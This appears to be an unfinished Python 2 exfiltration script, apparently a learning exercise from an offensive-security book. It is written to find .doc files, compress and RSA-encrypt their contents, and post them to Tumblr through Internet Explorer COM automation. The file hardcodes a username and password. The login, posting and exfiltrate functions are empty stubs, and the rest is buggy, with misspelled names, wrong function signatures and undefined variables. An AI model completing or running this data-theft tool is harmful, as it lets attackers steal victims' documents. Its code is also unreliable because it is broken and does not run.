import win32com.client, os, fnmatch, time, random, zlib
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OEAP

doc_type = ".doc"
username = "jms@bughunter.ca"
password = "justinBHP2014"
public_key = ""


def banner():
	print "[***]	IE COM automation p129	[***]"

def wait_for_browser(browser):
	while browser.ReadyState != 4 and browser.ReadyState != "complete":
		time.sleep(0.1)
	return

def encrypt_string():
	chunk_size = 256
	print "Compressing: %d bytes" % (len(plaintext))
	plaintext = zlib.compress(plaintext)
	print "Encrypting %d bytes" % (len(plaintext))
	rsakey = RSA.importKey(public_key)
	rsakey = PKCS1_OEAP.new(rsakey)
	encruypted = ""
	offset = 0
	while offset < len(plaintext):
		chunk = plaintext[offset:offset+chunk_size]
		if len(chunk) % chunk_size != -0:
			chunk += " " * (chunk_size - len(chunk))
		encrypted += rsakey.encrypt(chunk)
		offset += chunk_size
	encrypted = encrypted.encode("base64")
	print "Base64 encoded cyrpto: %d" % len(encrypted)
	return encrypted

def encrypt_post(filename):
	fd = open(filename, "rb")
	contents = fd.read()
	fd.close()
	encrypted_title = encrypt_string(filename)
	encrypted_body = encrypt_string(contents)
	return encrypted_title, encrypted_body

def random_sleep():
	time.sleep(random.randing(5,10))
	return

def login_to_tumblr():

def psot_to_tumblr():

def exfiltrate():

def main():

if __name__ == '__main__':
	main()